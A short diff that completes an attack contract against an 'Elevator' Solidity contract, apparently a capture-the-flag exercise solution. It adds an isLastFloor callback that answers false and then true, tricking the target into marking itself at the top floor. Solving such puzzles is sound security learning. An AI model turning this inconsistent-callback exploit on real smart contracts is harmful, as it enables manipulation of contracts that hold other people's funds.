@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 contract Attack {
     Elevator private immutable target;
+    uint private count;
 
     constructor(address _target) {
         target = Elevator(_target);
@@ -11,6 +12,11 @@ contract Attack {
     function win() external {
         target.goTo(1);
         require(target.top() == true, "not top");
+    }
+
+    function isLastFloor(uint) external returns (bool) {
+        count++;
+        return count > 1;
     }
 }
 
